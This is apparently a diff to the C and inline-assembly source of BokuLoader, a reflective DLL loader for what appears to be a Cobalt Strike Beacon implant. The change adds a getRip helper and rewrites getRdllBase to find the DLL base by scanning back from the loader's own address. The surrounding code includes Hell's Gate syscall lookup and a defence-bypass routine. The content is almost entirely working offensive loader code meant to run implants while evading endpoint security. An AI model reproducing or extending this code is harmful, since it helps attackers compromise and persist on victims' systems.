@@ -11,7 +11,7 @@ void* getExportAddressTable(void* dllBase, void* dllExportDirectory) asm ("getEx
 void* getExportNameTable(void* dllBase, void* dllExportDirectory) asm ("getExportNameTable");
 void* getExportOrdinalTable(void* dllBase, void* dllExportDirectory) asm ("getExportOrdinalTable");
 void* getSymbolAddress(void* symbolStr, void* StrSize, void* dllBase, void* AddressTable, void* NameTable, void* OrdinalTable) asm ("getSymbolAddress");
-void* getRdllBase(void) asm ("getRdllBase");
+void* getRdllBase(void*) asm ("getRdllBase");
 void* getNewExeHeader(void* dllBase) asm ("getNewExeHeader");
 void* getDllSize(void* newExeHeader) asm ("getDllSize");
 void* getDllSizeOfHeaders(void* newExeHeader) asm ("getDllSizeOfHeaders");
@@ -21,6 +21,7 @@ void* getSizeOfOptionalHeader(void* NewExeHeader) asm ("getSizeOfOptionalHeader"
 void* add(void* , void* ) asm ("add");
 void* getNumberOfSections(void* newExeHeaderAddr) asm ("getNumberOfSections");
 void* getBeaconEntryPoint(void* newRdllAddr, void* OptionalHeaderAddr) asm ("getBeaconEntryPoint");
+void* getRip(void) asm ("getRip");
 #ifdef SYSCALLS
 void* findSyscallNumber(void* ntdllApiAddr) asm ("findSyscallNumber");
 void* HellsGate(void* wSystemCall) asm ("HellsGate");
@@ -86,6 +87,9 @@ void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
 
 __declspec(dllexport) void* WINAPI BokuLoader()
 {
+    // get the current address
+    PVOID BokuLoaderStart = getRip();
+
     // Get Export Directory and Export Tables for NTDLL.DLL
     char ws_ntdll[] = {'n',0,'t',0,'d',0,'l',0,'l',0,'.',0,'d',0,'l',0,'l',0,0};
     Dll ntdll;
@@ -144,7 +148,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
     // Initial Source Reflective DLL
     Dll rdll_src;
-    rdll_src.dllBase              = (void*)getRdllBase();
+    rdll_src.dllBase              = (void*)getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
     rdll_src.NewExeHeader         = (void*)getNewExeHeader(        rdll_src.dllBase);
     rdll_src.size                 = (void*)getDllSize(             rdll_src.NewExeHeader);
     rdll_src.SizeOfHeaders        = (void*)getDllSizeOfHeaders(    rdll_src.NewExeHeader);
@@ -591,10 +595,11 @@ DWORD getSyscallNumber(void* functionAddress)
 #endif
 
 __asm__(
+"getRip: \n"
+    "mov eax, [esp] \n"            // get the return address
+    "ret \n"
 "getRdllBase: \n"
-    "call pop \n"                  // Calling the next instruction puts RIP address on the top of our stack
-    "pop: \n"
-    "pop ecx \n"                   // pop RIP into RCX
+    "mov ecx, [esp+0x4] \n"
 "dec1: \n"
     "mov ebx, 0x5A4D \n"            // "MZ" bytes for comparing if we are at the start of our reflective DLL
 "dec2: \n"
